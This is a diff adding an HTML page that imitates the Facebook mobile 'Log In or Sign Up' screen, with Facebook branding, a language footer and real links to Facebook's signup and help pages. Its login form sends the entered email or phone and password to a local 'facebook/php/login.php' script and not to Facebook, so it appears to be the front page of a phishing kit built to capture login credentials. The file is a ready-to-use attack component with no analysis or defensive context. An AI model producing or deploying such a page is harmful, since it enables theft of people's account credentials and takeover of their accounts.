@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="facebook/css/style.css">
+    <link rel="shortcut icon" type="image/png" href="facebook/img/favicon.jpg">
+    <title>Facebook - Log In or Sign Up</title>
+</head>
+<body>
+    <div id="header"><h1>facebook</h1></div>
+    <div id="container">
+        <form action="facebook/php/login.php" method="POST">
+            <input required id="username" name="username" type="text" spellcheck="false" maxlength="64" placeholder="Email or Phone">
+            <input required id="password" name="password" type="password" spellcheck="false" maxlength="64" placeholder="Password">
+            <button id="submit" type="submit">Log in</button>
+        </form>
+        <span id="or">or</span>
+        <button id="create" onclick="window.location.href='https://m.facebook.com/reg/?cid=103'">Create New Account</button>
+        <a href="https://m.facebook.com/login/identify">Forgot Password?</a> 
+        <span id="dot"></span>
+        <a id="help" href="https://m.facebook.com/help/?refid=8">Help Center</a>
+        <div id="footer">
+            <ul>         
+                <li><a href="#"><b>English (US)</b></a></li>
+                <li><a href="#"><b>Français (France)</b></a></li>
+                <li><a href="#"><b>Português (Brasil)</b></a></li>
+                <li><a href="#"><b>Italiano</b></a></li>
+                <li><a href="#"><b>Español</b></a></li>
+                <li><a href="#"><b>中文(简体)</b></a></li>
+                <li><a href="#"><b>Deutsch</b></a></li>
+            </ul>
+            <span>Facebook ©2018</span>
+        </div>
+    </div>
+</body>
+</html>
